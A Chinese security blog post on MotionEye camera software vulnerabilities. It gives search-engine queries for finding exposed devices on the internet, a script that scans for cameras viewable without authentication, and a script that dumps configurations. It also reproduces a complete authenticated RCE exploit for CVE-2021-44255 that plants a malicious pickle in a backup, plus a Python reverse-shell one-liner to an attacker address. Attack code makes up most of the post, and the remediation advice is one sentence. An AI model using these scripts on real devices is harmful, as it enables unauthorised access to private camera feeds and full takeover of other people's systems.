**严正声明：本文仅限于技术讨论与分享，严禁用于非法途径。**

## 简介

MotionEye是一款免费且功能强大的视频监控软件。若对于树莓派有所了解，您应该听说过它。它是用树莓派DIV监控的不二之选。MotionEye有两种安装形式，其一使用Dokcer容器，其二使用MotionEyeOS。它存在系列影响数年之久的RCE和未授权访问等漏洞。

## 基于网络空间搜索引擎查找MotionEye

我们开始使用网络空间搜索引擎查找MotionEye设备，通过网络空间搜索引擎发现互联中存在3.5W+台以上设备，这些搜索结果存在大量的可访问终端，发现漏洞也就从此开始了，下面我们举例几个常见平台的搜索规则。  
 **1、FOFA搜索规则：**

  * app="motionEye"

  * app="motionEye-摄像头服务器"

  * app="motionEye/0.39.3"

  * app="motionEye/0.40"

  * app="motionEye01"

  * app="motionEye/0.33"

  * app="motionEye/0.35"

 **2、QUAKE搜索规则：**

  * app:"MotionEye"

## 未授权访问&弱口令漏洞

我们在逐个尝试访问这些网络摄像头的时候，发现存在一定数量的终端存在未授权访问漏洞。直接访问就可以配置或观看摄像头,然而有一些用户名为admin\口令空或者用户名\口令均为空。可以使用脚本进行测试未授权访问漏洞。

  * 执行命令：

  * Python3 .\MotionEye_未授权访问.py http(s)://XXX.XXX.XXX.XXX

    
    
    import sys
    import requests
    def exp(url):
        for i in range(1,100):
            if url[-1] == "/":
                url = url + "picture/{0}/current/".format(i)
            else:
                url = url + "/picture/{0}/current/".format(i)
            rus = requests.get(url, verify=False)
            if "error" not in rus.text:
                print("可访问摄像头:{0}".format(url))
                break
    
    if __name__ == '__main__':
        ip = sys.argv[1]
        print("正在测试IP:{0}".format(ip))
        exp(ip)
    

  * 测试结果：  
![image](https://image.3001.net/images/20220315/1647348730_62308bfa2845b186c5c8c.png!small)  
![image](https://image.3001.net/images/20220315/1647348739_62308c039b82630795207.png!small)

## 信息泄露漏洞

在终端IP之后的URL中加入/config/list会有信息泄露。泄露的信息通常没有什么危害，但是有时候会泄露出用户名和密码。我们推荐使用提供的Python脚本来验证这个信息泄露问题。

  * 执行命令：

  * python3 .\MotionEye_信息泄露.py http(s)://XXX.XXX.XXX.XXX

    
    
    import sys
    import json
    import requests
    def exp(url):
        if url[-1] == "/":
            url = url + "config/list"
        else:
            url = url + "/config/list"
        rus = requests.get(url, verify=False)
        print("信息泄露内容:")
        print(json.dumps(json.loads(rus.text), sort_keys=True, indent=4))
    if __name__ == '__main__':
        ip = sys.argv[1]
        print("访问IP:{0}".format(ip))
        exp(ip)
    

  * 执行结果:  
![image](https://image.3001.net/images/20220315/1647348751_62308c0f5250794b0e0fb.png!small)

## 远程代码执行漏洞1(CVE-2021-44255)

在GITHUb我们找到了相关的GETSHELL工具，下面我们结合该工具分析下漏洞原理。首先脚本使用默认的用户名和密码登陆了终端，然后获取终端会话令牌用于保持登陆状态，紧接着下载终端原本备份，再者将恶意的序列化文件放入原本备份生成恶意备份，最后将恶意备份上传，最终设备重启之后导致GETSHELL。

    
    
    # https://github.com/pizza-power/motioneye-authenticated-RCE/blob/main/main.py
    
    import requests #HTTP(s)请求和响应相关模块
    import argparse # 接受控制台命令模块
    import os   # 系统模块
    import pickle # 序列化模块
    import hashlib # 哈希相关模块
    import tarfile # 打包文件模块
    import time # 时间模块
    import string # 字符串模块
    import random # 随机字符串模块
    from requests_toolbelt import MultipartEncoder # 文件上传模块
    import json # json模块
    
    
    # proxies = {"http": "http://127.0.0.1:9090", "https": "http://127.0.0.1:9090"}
    # 通过这里配置代理，应该是测试工具时候抓包用的。
    proxies = {}
    
    
    def get_cli_args():
        #这里是help信息，需要提供正确的用户名和密码才能GETSHELL。
        parser = argparse.ArgumentParser(description="MotionEye Authenticated RCE Exploit")
        parser.add_argument(
            "--victim",
            help="Victim url in format ip:port, or just ip if port 80",
            required=True,
        )
        parser.add_argument("--attacker", help="ipaddress:port of attacker", required=True)
        parser.add_argument(
            "--username", help="username of web interface, default=admin", default="admin"
        )
        parser.add_argument(
            "--password", help="password of web interface, default=blank", default=""
        )
        args = parser.parse_args()
        return args
    
    
    def login(username, password, victim_url):
        # 首先访问终端的IP，然后通过requests.Session建立会话。为了保持登录后Session可以使用登录后的令牌。
        session = requests.Session()
        useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
        headers = {"User-Agent": useragent}
        login_url = f"http://{victim_url}/login/"
        body = f"username={username}&password={password}"
        session.post(login_url, headers=headers, data=body)
        return session
    
    
    def download_config(username, victim_url, session):
        # 然后下载终端的备份文件。
        download_url = f"http://{victim_url}/config/backup/?_username={username}&_signature=5907c8158417212fbef26936d3e5d8a04178b46f"
        backup_file = session.get(download_url)
        open("motioneye-config.tar.gz", "wb").write(backup_file.content)
        return
    
    
    def create_pickle(ip_address, port):
        # 因为终端备份文件之中，存在Python序列化文件用于解析，所以存在反序列化漏洞。
        # 这里放入SHELLCODE代码。
        # 通过这段代码生成tasks.pickle文件，该文件会被放在恶意的备份中。
        shellcode = ""  # put your shellcode here
    
        class EvilPickle(object):
            def __reduce__(self):
                cmd = shellcode
                return os.system, (cmd,)
    
        # need protocol=2 and fix_imports=True for python2 compatibility
        pickle_data = pickle.dumps(EvilPickle(), protocol=2, fix_imports=True)
        with open("tasks.pickle", "wb") as file:
            file.write(pickle_data)
            file.close()
        return
    
    
    def decompress_add_file_recompress():
        # 将恶意的序列化文件，打包入备份文件之中。
        with tarfile.open("./motioneye-config.tar.gz") as original_backup:
            original_backup.extractall("./motioneye-config")
            original_backup.close()
        original_backup.close()
        os.remove("./motioneye-config.tar.gz")
        os.rename("./tasks.pickle", "./motioneye-config/tasks.pickle")
        with tarfile.open("./motioneye-config.tar.gz", "w:gz") as config_tar:
            config_tar.add("./motioneye-config/", arcname=".")
        config_tar.close()
        return
    
    
    def restore_config(username, password, victim_url, session):
        # 因为它正常的请求会发送时间戳，所以最好模拟时间戳。
        t = int(time.time() * 1000)
        path = f"/config/restore/?_={t}&_username={username}"
        # admin_hash 是管理员密码的sha1字符串。
        admin_hash = hashlib.sha1(password.encode("utf-8")).hexdigest().lower()
        signature = (
            hashlib.sha1(f"POST:{path}::{admin_hash}".encode("utf-8")).hexdigest().lower()
        )
        restore_url = f"http://{victim_url}/config/restore/?_={t}&_username=admin&_signature={signature}"
    
        # 因为上传文件时候会检测上传boundary信息，所以它会创建一个，用于上传文件。
        files = {
            "files": (
                "motioneye-config.tar.gz",
                open("motioneye-config.tar.gz", "rb"),
                "application/gzip",
            )
        }
    
        useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
        boundary = "----WebKitFormBoundary" + "".join(
            random.sample(string.ascii_letters + string.digits, 16)
        )
    
        m = MultipartEncoder(fields=files, boundary=boundary)
        headers = {
            "Content-Type": m.content_type,
            "User-Agent": useragent,
            "X-Requested-With": "XMLHttpRequest",
            "Cookie": "meye_username=_; monitor_info_1=; motion_detected_1=false; capture_fps_1=5.6",
            "Origin": f"http://{victim_url}",
            "Referer": f"http://{victim_url}",
            "Accept-Language": "en-US,en;q=0.9",
        }
        response = session.post(restore_url, data=m, headers=headers, proxies=proxies)
        # 如果响应为reboot，则shell上传成功了。
        content = json.loads(response.content.decode("utf-8"))
    
        if content["reboot"] == True:
            print("Rebooting! Stand by for shell!")
        else:
            print("Manual reboot needed!")
        return
    
    
    if __name__ == "__main__":
        print("Running exploit!")
        # 帮助信息
        arguments = get_cli_args()
        # 登录终端并且获取会话令牌。
        session = login(arguments.username, arguments.password, arguments.victim)
        # 下载原始的终端备份。
        download_config(arguments.username, arguments.victim, session)
        # 创建恶意的序列化文件，用于触发反序列化漏洞。
        create_pickle(arguments.attacker.split(":")[0], arguments.attacker.split(":")[1])
        # 将恶意的序列化文件放入原始的终端备份，生成恶意的备份文件。
        decompress_add_file_recompress()
        # 构造恶意文件的上传请求。
        restore_config(arguments.username, arguments.password, arguments.victim, session)
    

## 远程代码执行漏洞2

在登录admin账户之后，我们可以找到Motion Notifications功能，通过Run An End Command功能，能够执行反弹shell。

  * 执行命令：

  * python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.31.41",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  
截图如下：  
![image](https://image.3001.net/images/20220315/1647348767_62308c1f7933458b3dd99.png!small)

## 修复

目前厂商未对产品进行更新，境外互联网中还流行很多存在漏洞设备。在使用该软件时，建议配置强密码缓解漏洞所产生的影响。

## 尾声

当然如果将SSH密钥打包入备份文件，大概率能使用其免密登录。对此可见，虽然IOT设备在生活中比较常见，但是相关安全机制缺失比较严重。

